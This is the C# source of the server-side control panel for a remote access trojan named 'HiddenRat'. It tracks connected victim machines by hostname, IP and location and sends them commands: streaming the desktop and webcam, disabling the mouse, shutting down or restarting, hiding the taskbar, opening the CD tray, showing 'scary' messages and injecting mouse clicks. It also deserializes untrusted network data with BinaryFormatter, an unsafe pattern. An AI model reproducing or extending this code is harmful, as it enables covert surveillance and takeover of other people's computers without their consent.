using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Runtime.Serialization.Formatters.Binary;
using System.Configuration;
using System.Collections;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls.WebParts;
using System.Web.UI.HtmlControls;
using System.Xml;
using System.Windows.Input;

// webcam
using AForge.Video;
using AForge.Video.DirectShow;

namespace ServerForm
{
    public partial class Form1 : Form
    {
        bool doubleClick;
        string selectedClient;
        bool ClientsIsAlreadyConnected = false;
        bool webcamScan = false;
        RemoteDesktop remoteDesk = new RemoteDesktop();
        RemoteWebcam remoteWebcam = new RemoteWebcam();
        bool rd = false;
        bool wc = false;
        private TcpListener _server;
        private Boolean _isRunning;
        List<TcpClient> clients = new List<TcpClient>();
        string[] strClients = new string[100];
        int nb = 0;

        public Form1()
        {
            InitializeComponent();
            dataGridView_Clients.ColumnCount = 3;
            dataGridView_Clients.Columns[0].Name = "HostName";
            dataGridView_Clients.Columns[1].Name = "IP address";
            dataGridView_Clients.Columns[2].Name = "Country";
            dataGridView_Clients.Columns[0].Width = 150;
            dataGridView_Clients.Columns[1].Width = 150;
            dataGridView_Clients.Columns[2].Width = 150;
            btn_ExpandRemoteDesktop.Enabled = false;
            btn_ExpandRemoteWebcam.Enabled = false;
            btn_findWebcam.Enabled = false;
            btn_Hibernate.Enabled = false;
            btn_HideTaskBar.Enabled = false;
            btn_MouseDisable.Enabled = false;
            btn_MouseEnable.Enabled = false;
            btn_Restart.Enabled = false;
            btn_sendMessage.Enabled = false;
            btn_ShowTaskBar.Enabled = false;
            Btn_Shutdown.Enabled = false;
            btn_StartRD.Enabled = false;
            btn_StartWebcam.Enabled = false;
            btn_StopRD.Enabled = false;
            btn_StopServer.Enabled = false;
            btn_StopWebcam.Enabled = false;
            btn_StartWebcam.Enabled = false;
            btn_StopWebcam.Enabled = false;
            btn_StopRD.Enabled = false;
            dataGridView_Clients.Enabled = false;
        }
        
        public void server(int port)
        {
            _server = new TcpListener(IPAddress.Any, port);
            _server.Start();

            _isRunning = true;

            LoopClients();
        }

        public void LoopClients()
        {
            while (_isRunning)
            {
                ClientsIsAlreadyConnected = false;
                // wait for client connection
                TcpClient newClient = _server.AcceptTcpClient();
                for(int i = 0;i<clients.Count;i++)
                {
                    string[] ipAddressNewClient = newClient.Client.RemoteEndPoint.ToString().Split(':');
                    string[] ipAddressCurentClients = clients[i].Client.RemoteEndPoint.ToString().Split(':');
                    if(ipAddressNewClient[0] == ipAddressCurentClients[0])
                    {
                        ClientsIsAlreadyConnected = true;
                    }
                }
                if(!ClientsIsAlreadyConnected)
                {
                    clients.Add(newClient);
                    strClients[nb] = nb.ToString() + "_" + clients[nb].Client.RemoteEndPoint.ToString();
                    this.Invoke((MethodInvoker)(() => cbx_clients.Items.Add(newClient.Client.RemoteEndPoint.ToString())));
                    string[] ipaddress = newClient.Client.RemoteEndPoint.ToString().Split(':');
                    string[] row = new string[] { GetHostName(ipaddress[0]), ipaddress[0], getLocation(ipaddress[0]) };
                    this.Invoke((MethodInvoker)(() => dataGridView_Clients.Rows.Add(row)));
                    nb++;
                }
                
               
                
                // client found.
                // create a thread to handle communication
            }
        }
        public string getLocation(string ip)
        {
            try
            {
                string IP = ip;

                //Initializing a new xml document object to begin reading the xml file returned
                XmlDocument doc = new XmlDocument();
                doc.Load("http://www.freegeoip.net/xml");
                XmlNodeList nodeLstCity = doc.GetElementsByTagName("City");
                IP = "" + nodeLstCity[0].InnerText + "<br>" + IP;
                return IP;
                //this is my header that I love
            }
            catch
            {
                return "UNKNOW";
            }


        }
        public string GetHostName(string ipAddress)
        {
            try
            {
                IPHostEntry entry = Dns.GetHostEntry(ipAddress);
                if (entry != null)
                {
                    return entry.HostName;
                }
            }
            catch (SocketException ex)
            {
                //unknown host or
                //not every IP has a name
                //log exception (manage it)
            }

            return null;
        }
        public string getIp(string remoteendpoint)
        {
            try
            {
                string[] ipaddress = remoteendpoint.Split(':');
                return ipaddress[0];
            }
            catch
            {
                return "127.0.0.1";
            }
            
        }
        private void btn_startServer_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(() => server(5555));
            thread.Start();
            btn_startServer.Enabled = false;
            btn_StopServer.Enabled = true;
            dataGridView_Clients.Enabled = true;
        }
        public TcpClient getSelectedClient(string client)
        {
            TcpClient SelectedClient = null;
            for (int i = 0; i < clients.Count; i++)
            {
                if (getIp(clients[i].Client.RemoteEndPoint.ToString()) == client)
                {
                    SelectedClient = clients[i];
                }
            }
            return SelectedClient;
        }
        public void send(string client, string data, int nb)
        {
            try
            {
                StreamWriter sWriter = new StreamWriter(getSelectedClient(client).GetStream(), Encoding.ASCII);
                StreamReader sReader = new StreamReader(getSelectedClient(client).GetStream(), Encoding.ASCII);
                // you could use the NetworkStream to read and write, 
                // but there is no forcing flush, even when requested


                // reads from stream
                //sData = sReader.ReadLine();

                // shows content on the console.
                //Console.WriteLine("Client " + client.Client.RemoteEndPoint.ToString() + " :" + sData);

                // to write something back.

                sWriter.WriteLine(data + "_" + nb.ToString());
                sWriter.Flush();
            }
            catch
            {
                
                MessageBox.Show("aucun client séléctionné / error client", "HiddenRat", MessageBoxButtons.OK);
            }
            
        }

        private void btn_StopServer_Click(object sender, EventArgs e)
        {
            _isRunning = false;
            _server.Stop();
            btn_StopServer.Enabled = false;
            btn_startServer.Enabled = true;
        }

        private void btn_sendMessage_Click(object sender, EventArgs e)
        {
            if(radioButton_text.Checked)
            {
                send(selectedClient, tbx_message.Text, 1);
                //send(cbx_clients.SelectedItem.ToString(), tbx_message.Text, 1);
            }
            if (radioButton_vocal.Checked)
            {
                send(selectedClient, tbx_message.Text, 2);
            }
        }

       

        private void btn_MouseEnable_Click(object sender, EventArgs e)
        {
            send(selectedClient, "true", 5);
        }

        private void btn_MouseDisable_Click(object sender, EventArgs e)
        {
            send(selectedClient, "false", 5);
        }

        private void Btn_Shutdown_Click(object sender, EventArgs e)
        {
            send(selectedClient, "", 7);
        }

        private void btn_Restart_Click(object sender, EventArgs e)
        {
            send(selectedClient, "", 8);
        }

        private void btn_Hibernate_Click(object sender, EventArgs e)
        {
            send(selectedClient, "", 9);
        }

        private void btn_HideTaskBar_Click(object sender, EventArgs e)
        {
            send(selectedClient, "", 10);
        }

        private void btn_ShowTaskBar_Click(object sender, EventArgs e)
        {
            send(selectedClient, "", 11);
        }

        private void btn_StartRD_Click(object sender, EventArgs e)
        {
            rd = true;
            btn_StartRD.Enabled = false;
            btn_StopRD.Enabled = true;
            btn_ExpandRemoteDesktop.Enabled = true;
            send(selectedClient, "", 12);
            Thread t = new Thread(() => RD(getSelectedClient(selectedClient)) );
            t.Start();
        }
        
        private void btn_StopRD_Click(object sender, EventArgs e)
        {
            btn_StopRD.Enabled = false;
            btn_StartRD.Enabled = true;
            remoteDesk.Close();
            rd = false;
            send(selectedClient, "", 13);
            pbx_remoteDesk.Image = null;
            pbx_remoteDesk.BackColor = Color.Black;
        }

        public void RD(TcpClient client)
        {
            BinaryFormatter binFormatter = new BinaryFormatter();
            while(client.Connected && rd)
            {
                
                NetworkStream nNetStream = client.GetStream();
                if(remoteDesk.expand_RD)
                {
                    remoteDesk.screen = (Image)binFormatter.Deserialize(nNetStream);
                }
                else
                {
                    pbx_remoteDesk.Image = (Image)binFormatter.Deserialize(nNetStream);
                }
            }

        }
        public void WebCamCapture(TcpClient client)
        {
            BinaryFormatter binFormatterWebcam = new BinaryFormatter();
            while (client.Connected && wc)
            {
                NetworkStream nNetStreamWebcam = client.GetStream();
                if (remoteWebcam.expand_WC)
                {
                    remoteWebcam.webcam = (Bitmap)binFormatterWebcam.Deserialize(nNetStreamWebcam);
                }
                else
                {
                    pbx_webcam.Image = (Bitmap)binFormatterWebcam.Deserialize(nNetStreamWebcam);
                }
            }
        }
        public void webcamFinder()
        {
            StreamReader sReader = new StreamReader(getSelectedClient(selectedClient).GetStream(), Encoding.ASCII);
            string data = sReader.ReadLine();
            string[] tabdata = data.Split('_');
            for(int i = 0;i<tabdata.Length;i++)
            {
                if(tabdata[i] != null || tabdata[i] != string.Empty)
                {
                    cbx_webcam.Items.Add(tabdata[i]);
                }
                
            }
            
        }
        private void btn_StartWebcam_Click(object sender, EventArgs e)
        {
            if(cbx_webcam.SelectedItem != null)
            {
                wc = true;
                btn_StopWebcam.Enabled = true;
                btn_StartWebcam.Enabled = false;
                btn_ExpandRemoteWebcam.Enabled = true;
                send(selectedClient, cbx_webcam.SelectedIndex.ToString(), 14);
                Thread tWC = new Thread(() => WebCamCapture(getSelectedClient(selectedClient)));
                tWC.Start();
            }
            else
            {
                MessageBox.Show("Select a webcam...");
            }
            

        }

        private void btn_StopWebcam_Click(object sender, EventArgs e)
        {

            wc = false;
            remoteWebcam.Close();
            btn_StopWebcam.Enabled = false;
            btn_StartWebcam.Enabled = true;
            send(selectedClient, "", 15);
            pbx_webcam.Image = null;
            pbx_webcam.BackColor = Color.Black;
        }

        private void btn_findWebcam_Click(object sender, EventArgs e)
        {
            btn_findWebcam.Enabled = false;
            btn_StartWebcam.Enabled = true;
            send(selectedClient, "", 16);
            webcamFinder();
        }

        private void btn_ExpandRemoteWebcam_Click(object sender, EventArgs e)
        {
            remoteWebcam.expand_WC = true;
            remoteWebcam.Show();
            pbx_webcam.Image = Properties.Resources.WC;
        }

        private void btn_ExpandRemoteDesktop_Click(object sender, EventArgs e)
        {
            remoteDesk.expand_RD = true;
            remoteDesk.Show();
            pbx_remoteDesk.Image = Properties.Resources.RD;
        }

        private void dataGridView_Clients_CellClick(object sender, DataGridViewCellEventArgs e)
        {
            try
            {

                
                    
                        btn_findWebcam.Enabled = true;
                        btn_Hibernate.Enabled = true;
                        btn_HideTaskBar.Enabled = true;
                        btn_MouseDisable.Enabled = true;
                        btn_MouseEnable.Enabled = true;
                        btn_Restart.Enabled = true;
                        btn_sendMessage.Enabled = true;
                        btn_ShowTaskBar.Enabled = true;
                        Btn_Shutdown.Enabled = true;
                        btn_StartRD.Enabled = true;
                        int index = e.RowIndex;// get the Row Index
                        DataGridViewRow selectedRow = dataGridView_Clients.Rows[index];
                        selectedClient = selectedRow.Cells[1].Value.ToString();
                    
               
            }
            catch
            {
                Console.Write("no client are connected");
            }
        }

        private void btn_SendScaryMessage_Click(object sender, EventArgs e)
        {
            send(selectedClient, tbx_ScaryMessage.Text, 17);
        }

        private void btn_openCD_Click(object sender, EventArgs e)
        {
            send(selectedClient, "", 18);
        }

        private void btn_closeCD_Click(object sender, EventArgs e)
        {
            send(selectedClient, "", 19);
        }

        private void pbx_closeApp_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {
            
        }

        private void pbx_remoteDesk_Click(object sender, EventArgs e)
        {
            
            
        }

        private void pbx_remoteDesk_MouseMove(object sender, MouseEventArgs e)
        {

        }
        private void pbx_remoteDesk_MouseClick(object sender, MouseEventArgs e)
        {
            //doubleClick = false;
            //sendMouseClick(e.X, e.Y,pbx_remoteDesk.Width,pbx_remoteDesk.Height);
        }

        private void pbx_remoteDesk_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            sendDoubleMouseClick(e.X, e.Y, pbx_remoteDesk.Width, pbx_remoteDesk.Height);
        }
        public void sendMouseClick(int X,int Y ,int width, int height)
        {
            if (checkBox_Mouse.Checked)
            {
                int WidthScreen = width;
                int HeightScreen = height;
                label10.Text = X.ToString() + " , " + Y.ToString();
                string strCor = X.ToString() + "," + Y.ToString() + "," + WidthScreen.ToString() + "_" + HeightScreen.ToString();
                send(selectedClient, strCor, 20);

            }
        }
        public void sendDoubleMouseClick(int X , int Y, int width, int height)
        {
            if (checkBox_Mouse.Checked)
            {
                int WidthScreen = width;
                int HeightScreen = height;
                label10.Text = X.ToString() + " , " + Y.ToString();
                string strCor = X.ToString() + "," + Y.ToString() + "," + WidthScreen.ToString() + "_" + HeightScreen.ToString();
                send(selectedClient, strCor, 21);
            }
        }
    }
}